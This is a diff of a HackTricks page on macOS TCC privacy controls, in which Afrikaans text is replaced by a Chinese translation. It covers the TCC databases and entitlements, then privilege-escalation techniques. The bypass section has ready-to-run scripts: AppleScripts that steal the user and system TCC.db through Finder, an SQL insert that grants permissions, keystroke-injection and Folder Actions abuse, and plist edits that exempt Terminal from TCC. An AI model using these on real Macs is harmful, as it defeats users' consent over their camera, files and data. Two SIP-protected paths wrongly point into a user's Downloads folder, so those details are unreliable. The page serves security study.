@@ -15,52 +15,52 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-## **Basiese Inligting**
+## **基本信息**
 
-**TCC (Deursigtigheid, Toestemming, en Beheer)** is 'n sekuriteitsprotokol wat fokus op die regulering van toepassings se toestemmings. Sy primêre rol is om sensitiewe funksies soos **liggingsdienste, kontakte, foto's, mikrofoon, kamera, toeganklikheid, en volle skyf toegang** te beskerm. Deur eksplisiete gebruikers toestemming te vereis voordat app toegang tot hierdie elemente gegee word, verbeter TCC privaatheid en gebruikersbeheer oor hul data.
+**TCC（透明性、同意和控制）**是一种安全协议，专注于规范应用程序权限。其主要作用是保护敏感功能，如**位置服务、联系人、照片、麦克风、相机、辅助功能和完整磁盘访问**。通过在授予应用程序访问这些元素之前强制要求用户明确同意，TCC增强了隐私和用户对其数据的控制。
 
-Gebruikers teëkom TCC wanneer toepassings toegang tot beskermde funksies versoek. Dit is sigbaar deur 'n prompt wat gebruikers toelaat om **toegang goed te keur of te weier**. Verder, TCC akkommodeer direkte gebruikers aksies, soos **slepen en laat val van lêers in 'n toepassing**, om toegang tot spesifieke lêers te verleen, wat verseker dat toepassings slegs toegang het tot wat eksplisiet toegelaat word.
+当应用程序请求访问受保护功能时，用户会遇到TCC。这通过一个提示可见，允许用户**批准或拒绝访问**。此外，TCC还支持用户的直接操作，例如**将文件拖放到应用程序中**，以授予对特定文件的访问，确保应用程序仅访问明确允许的内容。
 
-![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)
+![TCC提示的示例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)
 
-**TCC** word hanteer deur die **daemon** geleë in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` en geconfigureer in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (wat die mach diens `com.apple.tccd.system` registreer).
+**TCC**由位于`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`的**守护进程**处理，并在`/System/Library/LaunchDaemons/com.apple.tccd.system.plist`中配置（注册mach服务`com.apple.tccd.system`）。
 
-Daar is 'n **gebruikermodus tccd** wat per ingelogde gebruiker loop, gedefinieer in `/System/Library/LaunchAgents/com.apple.tccd.plist`, wat die mach dienste `com.apple.tccd` en `com.apple.usernotifications.delegate.com.apple.tccd` registreer.
+每个登录用户都有一个**用户模式tccd**在运行，定义在`/System/Library/LaunchAgents/com.apple.tccd.plist`中，注册mach服务`com.apple.tccd`和`com.apple.usernotifications.delegate.com.apple.tccd`。
 
-Hier kan jy die tccd sien wat as stelsel en as gebruiker loop:
+在这里，您可以看到tccd作为系统和用户运行：
 ```bash
 ps -ef | grep tcc
 0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
 501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 ```
-Permissions is **geërf van die ouer** toepassing en die **toestemmings** word **gevolg** op grond van die **Bundle ID** en die **Developer ID**.
+权限是**从父应用程序继承**的，**权限**是**根据** **Bundle ID** 和 **Developer ID** **跟踪**的。
 
-### TCC Databases
+### TCC 数据库
 
-Die toelaes/weiering word dan in sommige TCC-databasisse gestoor:
+允许/拒绝然后存储在一些 TCC 数据库中：
 
-* Die stelselswye databasis in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
-* Hierdie databasis is **SIP beskerm**, so slegs 'n SIP omseiling kan daarin skryf.
-* Die gebruiker TCC databasis **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** vir per-gebruiker voorkeure.
-* Hierdie databasis is beskerm so slegs prosesse met hoë TCC voorregte soos Volledige Skyf Toegang kan daarin skryf (maar dit is nie deur SIP beskerm nie).
+* 系统范围的数据库在 **`/Library/Application Support/com.apple.TCC/TCC.db`**。
+* 该数据库是**SIP 保护**的，因此只有 SIP 绕过可以写入它。
+* 用户 TCC 数据库 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** 用于每个用户的偏好设置。
+* 该数据库受到保护，因此只有具有高 TCC 权限的进程（如完全磁盘访问）可以写入它（但它不受 SIP 保护）。
 
 {% hint style="warning" %}
-Die vorige databasisse is ook **TCC beskerm vir lees toegang**. So jy **sal nie in staat wees om te lees** jou gewone gebruiker TCC databasis tensy dit van 'n TCC voorregte proses is.
+之前的数据库也**受到 TCC 保护以进行读取访问**。因此，您**无法读取**常规用户 TCC 数据库，除非它来自具有 TCC 特权的进程。
 
-Onthou egter dat 'n proses met hierdie hoë voorregte (soos **FDA** of **`kTCCServiceEndpointSecurityClient`**) in staat sal wees om in die gebruikers TCC databasis te skryf.
+但是，请记住，具有这些高权限的进程（如 **FDA** 或 **`kTCCServiceEndpointSecurityClient`**）将能够写入用户的 TCC 数据库。
 {% endhint %}
 
-* Daar is 'n **derde** TCC databasis in **`/var/db/locationd/clients.plist`** om kliënte aan te dui wat toegelaat word om **toegang tot ligging dienste** te hê.
-* Die SIP beskermde lêer **`/Users/carlospolop/Downloads/REG.db`** (ook beskerm teen lees toegang met TCC), bevat die **ligging** van al die **geldige TCC databasisse**.
-* Die SIP beskermde lêer **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (ook beskerm teen lees toegang met TCC), bevat meer TCC toegewyde toestemmings.
-* Die SIP beskermde lêer **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (maar leesbaar deur enige iemand) is 'n toelaat lys van toepassings wat 'n TCC uitsondering vereis.
+* 在 **`/var/db/locationd/clients.plist`** 中还有一个**第三个** TCC 数据库，用于指示允许**访问位置服务**的客户端。
+* SIP 保护文件 **`/Users/carlospolop/Downloads/REG.db`**（也受到 TCC 的读取访问保护）包含所有**有效 TCC 数据库**的**位置**。
+* SIP 保护文件 **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（也受到 TCC 的读取访问保护）包含更多 TCC 授予的权限。
+* SIP 保护文件 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（任何人可读）是需要 TCC 例外的应用程序的允许列表。
 
 {% hint style="success" %}
-Die TCC databasis in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**
+iOS 中的 TCC 数据库在 **`/private/var/mobile/Library/TCC/TCC.db`**。
 {% endhint %}
 
 {% hint style="info" %}
-Die **kennisgewing sentrum UI** kan **veranderings in die stelsel TCC databasis** maak:
+**通知中心 UI** 可以对**系统 TCC 数据库**进行**更改**：
 
 {% code overflow="wrap" %}
 ```bash
@@ -71,14 +71,13 @@ com.apple.rootless.storage.TCC
 ```
 {% endcode %}
 
-Gebruikers kan egter **reëls verwyder of navraag doen** met die **`tccutil`** opdraglyn nut.
-
+然而，用户可以使用 **`tccutil`** 命令行工具 **删除或查询规则**。
 {% endhint %}
 
-#### Navraag oor die databasisse
+#### 查询数据库
 
 {% tabs %}
-{% tab title="gebruikers DB" %}
+{% tab title="用户数据库" %}
 {% code overflow="wrap" %}
 ```bash
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
@@ -99,7 +98,7 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 {% endcode %}
 {% endtab %}
 
-{% tab title="stelseldatabasis" %}
+{% tab title="系统数据库" %}
 {% code overflow="wrap" %}
 ```bash
 sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
@@ -125,18 +124,18 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 {% endtabs %}
 
 {% hint style="success" %}
-Deur beide databasisse te kontroleer, kan jy die toestemmings wat 'n app toegelaat het, verbied het, of nie het nie (dit sal daarna vra) nagaan.
+检查两个数据库，您可以查看应用程序允许、禁止或没有的权限（它会请求权限）。
 {% endhint %}
 
-* Die **`service`** is die TCC **toestemming** string voorstelling
-* Die **`client`** is die **bundel ID** of **pad na binêre** met die toestemmings
-* Die **`client_type`** dui aan of dit 'n Bundel Identifiseerder(0) of 'n absolute pad(1) is
+* **`service`** 是 TCC **权限** 的字符串表示
+* **`client`** 是具有权限的 **bundle ID** 或 **二进制文件路径**
+* **`client_type`** 指示它是 Bundle Identifier(0) 还是绝对路径(1)
 
 <details>
 
-<summary>Hoe om uit te voer as dit 'n absolute pad is</summary>
+<summary>如果是绝对路径，如何执行</summary>
 
-Doen net **`launctl load you_bin.plist`**, met 'n plist soos:
+只需执行 **`launctl load you_bin.plist`**，plist 如下：
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -175,9 +174,9 @@ Doen net **`launctl load you_bin.plist`**, met 'n plist soos:
 ```
 </details>
 
-* Die **`auth_value`** kan verskillende waardes hê: denied(0), unknown(1), allowed(2), of limited(3).
-* Die **`auth_reason`** kan die volgende waardes neem: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
-* Die **csreq** veld is daar om aan te dui hoe om die binêre te verifieer om uit te voer en die TCC-toestemmings toe te ken:
+* **`auth_value`** 可以有不同的值：denied(0)、unknown(1)、allowed(2) 或 limited(3)。
+* **`auth_reason`** 可以取以下值：Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
+* **csreq** 字段用于指示如何验证要执行的二进制文件并授予 TCC 权限：
 ```bash
 # Query to get cserq in printable hex
 select service, client, hex(csreq) from access where auth_value=2;
@@ -193,15 +192,15 @@ echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
 REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
 echo "X'$REQ_HEX'"
 ```
-* Vir meer inligting oor die **ander velde** van die tabel [**kyk hierdie blogpos**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
+* 有关表中**其他字段**的更多信息，请[**查看这篇博客文章**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。
 
-Jy kan ook **reeds gegee toestemmings** aan toepassings in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` kyk.
+您还可以在`系统偏好设置 --> 安全性与隐私 --> 隐私 --> 文件和文件夹`中检查**已授予的权限**。
 
 {% hint style="success" %}
-Gebruikers _kan_ **reëls verwyder of navraag doen** met **`tccutil`** .
+用户_可以_ **删除或查询规则** 使用 **`tccutil`** 。
 {% endhint %}
 
-#### Stel TCC-toestemmings terug
+#### 重置 TCC 权限
 ```bash
 # You can reset all the permissions given to an application with
 tccutil reset All app.some.id
@@ -209,9 +208,9 @@ tccutil reset All app.some.id
 # Reset the permissions granted to all apps
 tccutil reset All
 ```
-### TCC Handtekening Kontroles
+### TCC 签名检查
 
-Die TCC **databasis** stoor die **Bundle ID** van die toepassing, maar dit **stoor** ook **inligting** oor die **handtekening** om te **verseker** dat die App wat vra om 'n toestemming te gebruik die korrekte een is.
+TCC **数据库** 存储应用程序的 **Bundle ID**，但它也 **存储** **信息** 关于 **签名** 以 **确保** 请求使用权限的应用程序是正确的。
 
 {% code overflow="wrap" %}
 ```bash
@@ -228,17 +227,17 @@ csreq -t -r /tmp/telegram_csreq.bin
 {% endcode %}
 
 {% hint style="warning" %}
-Daarom sal ander toepassings wat dieselfde naam en bundel-ID gebruik nie in staat wees om toegang te verkry tot die toestemmings wat aan ander toepassings gegee is nie.
+因此，使用相同名称和包 ID 的其他应用程序将无法访问授予其他应用程序的权限。
 {% endhint %}
 
-### Regte & TCC Toestemmings
+### 权限与 TCC 权限
 
-Toepassings **moet nie net** **aansoek doen** en **toegang** tot sommige hulpbronne **gekry het** nie, hulle moet ook **die relevante regte hê**.\
-Byvoorbeeld **Telegram** het die reg `com.apple.security.device.camera` om **toegang tot die kamera** aan te vra. 'n **toepassing** wat **nie** hierdie **reg het nie, sal nie in staat wees** om toegang tot die kamera te verkry (en die gebruiker sal nie eens vir die toestemmings gevra word nie).
+应用程序**不仅需要**请求并获得对某些资源的**访问权限**，它们还需要**拥有相关的权限**。\
+例如，**Telegram** 拥有权限 `com.apple.security.device.camera` 来请求**访问相机**。一个**没有**此**权限的应用程序将无法**访问相机（用户甚至不会被询问权限）。
 
-Echter, vir toepassings om **toegang** tot **sekere gebruikersmappies** te hê, soos `~/Desktop`, `~/Downloads` en `~/Documents`, hoef hulle **nie** enige spesifieke **regte te hê nie.** Die stelsel sal toegang deursigtig hanteer en **die gebruiker** soos nodig vra.
+然而，应用程序要**访问**某些用户文件夹，例如 `~/Desktop`、`~/Downloads` 和 `~/Documents`，它们**不需要**任何特定的**权限**。系统将透明地处理访问并**根据需要提示用户**。
 
-Apple se toepassings **sal nie pop-ups genereer** nie. Hulle bevat **vooraf-gegewe regte** in hul **regte** lys, wat beteken hulle sal **nooit 'n pop-up genereer** nie, **ook** sal hulle nie in enige van die **TCC databasisse** verskyn nie. Byvoorbeeld:
+苹果的应用程序**不会生成提示**。它们在其**权限**列表中包含**预授予的权限**，这意味着它们**永远不会生成弹出窗口**，**也不会**出现在任何**TCC 数据库**中。例如：
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -249,23 +248,23 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 <string>kTCCServiceAddressBook</string>
 </array>
 ```
-Dit sal verhoed dat Kalender die gebruiker vra om toegang tot herinneringe, kalender en die adresboek te verkry.
+这将避免日历询问用户访问提醒、日历和地址簿。
 
 {% hint style="success" %}
-Afgesien van 'n paar amptelike dokumentasie oor regte, is dit ook moontlik om onoffisiële **interessante inligting oor regte in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) te vind.
+除了关于权限的一些官方文档外，还可以在 [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) 找到一些非官方的**有趣信息**。
 {% endhint %}
 
-Sommige TCC-toestemmings is: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Daar is geen openbare lys wat al hulle definieer nie, maar jy kan hierdie [**lys van bekende**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) nagaan.
+一些 TCC 权限包括：kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... 没有公开的列表定义所有权限，但您可以查看这个 [**已知权限列表**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)。
 
-### Sensitiewe onbeveiligde plekke
+### 敏感未保护位置
 
-* $HOME (self)
-* $HOME/.ssh, $HOME/.aws, ens.
+* $HOME（本身）
+* $HOME/.ssh, $HOME/.aws 等
 * /tmp
 
-### Gebruiker se Intent / com.apple.macl
+### 用户意图 / com.apple.macl
 
-Soos vroeër genoem, is dit moontlik om **toegang aan 'n App tot 'n lêer te verleen deur dit te sleep en te laat val**. Hierdie toegang sal nie in enige TCC-databasis gespesifiseer word nie, maar as 'n **verlengde** **attribuut van die lêer**. Hierdie attribuut sal die **UUID** van die toegelate app **stoor**:
+如前所述，可以通过将文件拖放到应用程序上来**授予应用程序对文件的访问权限**。此访问权限不会在任何 TCC 数据库中指定，而是作为文件的**扩展** **属性**。此属性将**存储允许的应用程序的 UUID**：
 ```bash
 xattr Desktop/private.txt
 com.apple.macl
@@ -281,22 +280,22 @@ otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| gr
 uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
 {% hint style="info" %}
-Dit is nuuskierig dat die **`com.apple.macl`** attribuut bestuur word deur die **Sandbox**, nie tccd nie.
+有趣的是，**`com.apple.macl`** 属性是由 **Sandbox** 管理的，而不是 tccd。
 
-Neem ook kennis dat as jy 'n lêer wat die UUID van 'n app op jou rekenaar toelaat na 'n ander rekenaar skuif, omdat dieselfde app verskillende UIDs sal hê, dit nie toegang tot daardie app sal verleen nie.
+还要注意，如果您将允许计算机上应用程序 UUID 的文件移动到另一台计算机，由于同一应用程序将具有不同的 UID，它将无法授予该应用程序访问权限。
 {% endhint %}
 
-Die uitgebreide attribuut `com.apple.macl` **kan nie verwyder** word soos ander uitgebreide attribuut nie omdat dit **beskerm word deur SIP**. Dit is egter moontlik om dit te deaktiveer **deur die lêer te zip**, **te verwyder** en **weer te unzip**.
+扩展属性 `com.apple.macl` **无法像其他扩展属性那样被清除**，因为它是 **受 SIP 保护的**。然而，正如 [**在这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过 **压缩** 文件、**删除** 它和 **解压缩** 它来禁用它。
 
-## TCC Privesc & Bypasses
+## TCC 权限提升与绕过
 
-### Voeg in by TCC
+### 插入到 TCC
 
-As jy op 'n stadium daarin slaag om skrywe toegang oor 'n TCC databasis te verkry, kan jy iets soos die volgende gebruik om 'n inskrywing toe te voeg (verwyder die kommentaar):
+如果您在某个时刻成功获得 TCC 数据库的写入访问权限，可以使用以下内容添加条目（删除注释）：
 
 <details>
 
-<summary>Voeg in by TCC voorbeeld</summary>
+<summary>插入到 TCC 示例</summary>
 ```sql
 INSERT INTO access (
 service,
@@ -340,7 +339,7 @@ strftime('%s', 'now') -- last_reminded with default current timestamp
 
 ### TCC Payloads
 
-As jy daarin geslaag het om in 'n app met sommige TCC-toestemmings te kom, kyk na die volgende bladsy met TCC-payloads om dit te misbruik:
+如果你成功进入了一个具有某些 TCC 权限的应用程序，请查看以下页面以获取 TCC 负载以进行滥用：
 
 {% content-ref url="macos-tcc-payloads.md" %}
 [macos-tcc-payloads.md](macos-tcc-payloads.md)
@@ -348,19 +347,19 @@ As jy daarin geslaag het om in 'n app met sommige TCC-toestemmings te kom, kyk n
 
 ### Apple Events
 
-Leer meer oor Apple Events in:
+了解 Apple Events 的内容：
 
 {% content-ref url="macos-apple-events.md" %}
 [macos-apple-events.md](macos-apple-events.md)
 {% endcontent-ref %}
 
-### Automatisering (Finder) na FDA\*
+### Automation (Finder) to FDA\*
 
-Die TCC-naam van die Automatiseringstoestemming is: **`kTCCServiceAppleEvents`**\
-Hierdie spesifieke TCC-toestemming dui ook die **aansoek aan wat binne die TCC-databasis bestuur kan word** (so die toestemmings laat nie net toe om alles te bestuur nie).
+TCC 权限的名称是：**`kTCCServiceAppleEvents`**\
+这个特定的 TCC 权限还指示了 **可以在 TCC 数据库中管理的应用程序**（因此权限并不允许管理所有内容）。
 
-**Finder** is 'n aansoek wat **altyd FDA het** (selfs al verskyn dit nie in die UI nie), so as jy **Automatisering** voorregte oor dit het, kan jy sy voorregte misbruik om **dit sekere aksies te laat uitvoer**.\
-In hierdie geval sal jou aansoek die toestemming **`kTCCServiceAppleEvents`** oor **`com.apple.Finder`** benodig.
+**Finder** 是一个 **始终具有 FDA** 的应用程序（即使它在 UI 中不显示），因此如果你对它拥有 **Automation** 权限，你可以滥用其权限以 **执行某些操作**。\
+在这种情况下，你的应用程序需要对 **`com.apple.Finder`** 拥有权限 **`kTCCServiceAppleEvents`**。
 
 {% tabs %}
 {% tab title="Steal users TCC.db" %}
@@ -377,7 +376,7 @@ EOD
 ```
 {% endtab %}
 
-{% tab title="Steal systems TCC.db" %}
+{% tab title="窃取系统 TCC.db" %}
 ```applescript
 osascript<<EOD
 tell application "Finder"
@@ -390,25 +389,25 @@ EOD
 {% endtab %}
 {% endtabs %}
 
-Jy kan dit misbruik om **jou eie gebruiker TCC databasis te skryf**.
+您可以利用此权限**编写您自己的用户 TCC 数据库**。
 
 {% hint style="warning" %}
-Met hierdie toestemming sal jy in staat wees om **Finder te vra om toegang tot TCC-beperkte vouers** te verkry en vir jou die lêers te gee, maar sover ek weet, sal jy **nie in staat wees om Finder willekeurige kode te laat uitvoer** om sy FDA-toegang ten volle te misbruik nie.
+拥有此权限后，您将能够**请求 Finder 访问 TCC 限制的文件夹**并获取文件，但据我所知，您**无法使 Finder 执行任意代码**以完全滥用其 FDA 访问权限。
 
-Daarom sal jy nie in staat wees om die volle FDA vermoëns te misbruik nie.
+因此，您将无法滥用完整的 FDA 能力。
 {% endhint %}
 
-Dit is die TCC-prompt om outomatiseringsprivileges oor Finder te verkry:
+这是获取 Finder 自动化权限的 TCC 提示：
 
 <figure><img src="../../../../.gitbook/assets/image (27).png" alt="" width="244"><figcaption></figcaption></figure>
 
 {% hint style="danger" %}
-Let daarop dat omdat die **Automator** toepassing die TCC toestemming **`kTCCServiceAppleEvents`** het, dit **enige toepassing** kan **beheer**, soos Finder. So as jy die toestemming het om Automator te beheer, kan jy ook die **Finder** met 'n kode soos die een hieronder beheer:
+请注意，由于**Automator** 应用具有 TCC 权限 **`kTCCServiceAppleEvents`**，它可以**控制任何应用**，如 Finder。因此，拥有控制 Automator 的权限后，您也可以使用如下代码控制**Finder**：
 {% endhint %}
 
 <details>
 
-<summary>Kry 'n shell binne Automator</summary>
+<summary>在 Automator 中获取 shell</summary>
 ```applescript
 osascript<<EOD
 set theScript to "touch /tmp/something"
@@ -430,11 +429,11 @@ EOD
 ```
 </details>
 
-Die selfde gebeur met die **Script Editor app,** dit kan Finder beheer, maar met 'n AppleScript kan jy dit nie dwing om 'n script uit te voer nie.
+同样的情况发生在 **Script Editor app**，它可以控制 Finder，但使用 AppleScript 你无法强制它执行脚本。
 
-### Automatisering (SE) na sommige TCC
+### 自动化 (SE) 到某些 TCC
 
-**Stelsels gebeurtenisse kan Folder Actions skep, en Folder actions kan toegang tot sommige TCC vouers hê** (Bureaublad, Dokumente & Aflaaie), so 'n script soos die volgende kan gebruik word om hierdie gedrag te misbruik:
+**系统事件可以创建文件夹操作，而文件夹操作可以访问一些 TCC 文件夹**（桌面、文档和下载），因此可以使用如下脚本来利用这种行为：
 ```bash
 # Create script to execute with the action
 cat > "/tmp/script.js" <<EOD
@@ -476,11 +475,11 @@ EOD
 touch "$HOME/Desktop/file"
 rm "$HOME/Desktop/file"
 ```
-### Outomatisering (SE) + Toeganklikheid (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** na FDA\*
+### 自动化 (SE) + 辅助功能 (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** 到 FDA\*
 
-Outomatisering op **`System Events`** + Toeganklikheid (**`kTCCServicePostEvent`**) maak dit moontlik om **toetsdrukke na prosesse** te stuur. Op hierdie manier kan jy Finder misbruik om die gebruikers se TCC.db te verander of om FDA aan 'n arbitrêre toepassing te gee (alhoewel 'n wagwoord hiervoor gevra mag word).
+在 **`System Events`** 上的自动化 + 辅助功能 (**`kTCCServicePostEvent`**) 允许向进程发送 **按键**。通过这种方式，您可以滥用 Finder 来更改用户的 TCC.db 或为任意应用程序提供 FDA（尽管可能会提示输入密码）。
 
-Finder wat gebruikers se TCC.db oorskryf voorbeeld:
+Finder 覆盖用户 TCC.db 示例：
 ```applescript
 -- store the TCC.db file to copy in /tmp
 osascript <<EOF
@@ -526,41 +525,41 @@ keystroke "v" using {command down}
 end tell
 EOF
 ```
-### `kTCCServiceAccessibility` na FDA\*
+### `kTCCServiceAccessibility` 到 FDA\*
 
-Kyk na hierdie bladsy vir [**payloads om die Toeganklikheid toestemmings te misbruik**](macos-tcc-payloads.md#accessibility) om privesc na FDA\* of om 'n keylogger te loop byvoorbeeld.
+查看此页面以获取一些 [**滥用可访问性权限的有效载荷**](macos-tcc-payloads.md#accessibility) 以提升到 FDA\* 或运行键盘记录器，例如。
 
-### **Eindpunt Sekuriteit Kliënt na FDA**
+### **端点安全客户端到 FDA**
 
-As jy **`kTCCServiceEndpointSecurityClient`** het, het jy FDA. Einde.
+如果你有 **`kTCCServiceEndpointSecurityClient`**，你就有 FDA。结束。
 
-### Stelselsbeleid SysAdmin Lêer na FDA
+### 系统策略 SysAdmin 文件到 FDA
 
-**`kTCCServiceSystemPolicySysAdminFiles`** laat toe om die **`NFSHomeDirectory`** attribuut van 'n gebruiker te **verander** wat sy tuisgids verander en dus toelaat om **TCC te omseil**.
+**`kTCCServiceSystemPolicySysAdminFiles`** 允许 **更改** 用户的 **`NFSHomeDirectory`** 属性，这会更改他的主文件夹，从而允许 **绕过 TCC**。
 
-### Gebruiker TCC DB na FDA
+### 用户 TCC 数据库到 FDA
 
-Deur **skryftoestemmings** oor die **gebruiker TCC** databasis te verkry, kan jy \*\*nie\*\* vir jouself **`FDA`** toestemmings gee nie, slegs die een wat in die stelseldatabasis woon kan dit toekenn.
+获得 **用户 TCC** 数据库的 **写权限** 你 \*\*不能\*\* 授予自己 **`FDA`** 权限，只有系统数据库中的用户可以授予。
 
-Maar jy kan **kan** vir jouself **`Outomatisering regte na Finder`** gee, en die vorige tegniek misbruik om na FDA\* te eskaleer.
+但你可以 **授予** 自己 **`Finder 的自动化权限`**，并滥用之前的技术提升到 FDA\*。
 
-### **FDA na TCC toestemmings**
+### **FDA 到 TCC 权限**
 
-**Volledige Skyf Toegang** is TCC se naam is **`kTCCServiceSystemPolicyAllFiles`**
+**完全磁盘访问** 在 TCC 中的名称是 **`kTCCServiceSystemPolicyAllFiles`**
 
-Ek dink nie dit is 'n werklike privesc nie, maar net ingeval jy dit nuttig vind: As jy 'n program met FDA beheer, kan jy **die gebruikers TCC databasis verander en vir jouself enige toegang gee**. Dit kan nuttig wees as 'n volhardingstegniek ingeval jy jou FDA toestemmings mag verloor.
+我认为这不是真正的权限提升，但以防你觉得有用：如果你控制一个具有 FDA 的程序，你可以 **修改用户的 TCC 数据库并授予自己任何访问权限**。这可以作为一种持久性技术，以防你可能失去 FDA 权限。
 
-### **SIP Omseiling na TCC Omseiling**
+### **SIP 绕过到 TCC 绕过**
 
-Die stelsel **TCC databasis** is beskerm deur **SIP**, daarom kan slegs prosesse met die **aangegewe regte dit verander**. Daarom, as 'n aanvaller 'n **SIP omseiling** oor 'n **lêer** vind (in staat wees om 'n lêer wat deur SIP beperk is te verander), sal hy in staat wees om:
+系统 **TCC 数据库** 受到 **SIP** 保护，这就是为什么只有具有 **指示的权限** 的进程才能修改它。因此，如果攻击者找到一个 **SIP 绕过** 通过一个 **文件**（能够修改受 SIP 限制的文件），他将能够：
 
-* **Die beskerming** van 'n TCC databasis te verwyder, en vir homself al TCC toestemmings te gee. Hy kan enige van hierdie lêers misbruik byvoorbeeld:
-* Die TCC stelseldatabasis
+* **移除** TCC 数据库的保护，并授予自己所有 TCC 权限。他可以滥用这些文件中的任何一个，例如：
+* TCC 系统数据库
 * REG.db
 * MDMOverrides.plist
 
-Daar is egter 'n ander opsie om hierdie **SIP omseiling te misbruik om TCC te omseil**, die lêer `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is 'n toelaatlys van toepassings wat 'n TCC uitsondering vereis. Daarom, as 'n aanvaller die **SIP beskerming** van hierdie lêer kan **verwyder** en sy **eie toepassing** kan byvoeg, sal die toepassing in staat wees om TCC te omseil.\
-Byvoorbeeld om terminal toe te voeg:
+然而，还有另一种选择可以滥用这个 **SIP 绕过来绕过 TCC**，文件 `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` 是一个需要 TCC 例外的应用程序的允许列表。因此，如果攻击者可以 **移除此文件的 SIP 保护** 并添加自己的 **应用程序**，该应用程序将能够绕过 TCC。\
+例如添加终端：
 ```bash
 # Get needed info
 codesign -d -r- /System/Applications/Utilities/Terminal.app
@@ -588,13 +587,13 @@ AllowApplicationsList.plist:
 </dict>
 </plist>
 ```
-### TCC Bypasses
+### TCC 绕过
 
 {% content-ref url="macos-tcc-bypasses/" %}
 [macos-tcc-bypasses](macos-tcc-bypasses/)
 {% endcontent-ref %}
 
-## Verwysings
+## 参考文献
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
@@ -602,16 +601,16 @@ AllowApplicationsList.plist:
 * [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
